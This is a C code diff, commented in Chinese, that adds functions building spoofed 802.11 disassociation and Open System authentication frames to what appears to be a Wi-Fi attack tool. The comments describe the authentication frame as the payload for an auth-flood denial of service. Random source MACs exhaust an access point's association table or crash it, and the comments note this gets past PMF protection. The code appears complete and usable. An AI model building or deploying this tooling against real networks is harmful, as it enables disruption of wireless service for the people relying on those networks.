@@ -245,3 +245,53 @@ int mk_probe_req_frame(uint8_t *out, int max_len, const uint8_t src[6],
 
     return p;
 }
+
+/* Disassociation: 与 Deauth 同布局, 仅 subtype 不同 (subtype=10 -> 0xA0).
+ * 语义上比 deauth 更"重": 客户端收到后会清空关联状态, 必须重新走完整关联,
+ * 对 PMF 开启的 AP 同样无效 (属于被保护的管理帧). */
+int mk_disassoc_frame(uint8_t *out, const uint8_t bssid[6], const uint8_t sta[6],
+                      bool from_ap_to_sta, uint16_t reason)
+{
+    out[0] = 0xA0;  /* subtype 10 = 0b1010 -> bits 7-4 */
+    out[1] = 0x00;
+    out[2] = 0x00; out[3] = 0x00;
+
+    if (from_ap_to_sta) {
+        memcpy(out + 4,  sta,  6);
+        memcpy(out + 10, bssid, 6);
+        memcpy(out + 16, bssid, 6);
+    } else {
+        memcpy(out + 4,  bssid, 6);
+        memcpy(out + 10, sta,   6);
+        memcpy(out + 16, bssid, 6);
+    }
+    out[22] = 0x00; out[23] = 0x00;
+    out[24] = (uint8_t)(reason & 0xff);
+    out[25] = (uint8_t)(reason >> 8);
+    return 26;
+}
+
+/* Authentication (Open System) request: 经典 auth flood 的载荷.
+ * 向 AP (addr1=AP, addr3=BSSID) 以随机源 MAC (addr2) 反复发, 每台"新"MAC
+ * 都会逼 AP 在关联表里分配一项; 脆弱的 AP 关联表被打满或状态机被打崩后即
+ * 拒绝服务 (这正是"发大量垃圾让路由器崩"的实战向量). auth 不是被保护的管理帧,
+ * 即便 AP 开了 PMF 也照收, 所以比 deauth/disassoc 更可靠.
+ * 帧体: Algorithm(2B)=0, Seq(2B)=1, Status(2B)=0. */
+int mk_auth_frame(uint8_t *out, const uint8_t bssid[6], const uint8_t sta[6])
+{
+    out[0] = 0xB0;  /* subtype 11 = 0b1011 -> bits 7-4 */
+    out[1] = 0x00;
+    out[2] = 0x00; out[3] = 0x00;          /* duration */
+
+    /* addr1(DA)=AP, addr2(SA)=伪装 STA, addr3(BSSID)=AP */
+    memcpy(out + 4,  bssid, 6);
+    memcpy(out + 10, sta,   6);
+    memcpy(out + 16, bssid, 6);
+    out[22] = 0x00; out[23] = 0x00;        /* seq ctrl */
+
+    /* 认证算法 0=Open, 序列号 1 (首个), 状态码 0 */
+    out[24] = 0x00; out[25] = 0x00;
+    out[26] = 0x01; out[27] = 0x00;
+    out[28] = 0x00; out[29] = 0x00;
+    return 30;
+}
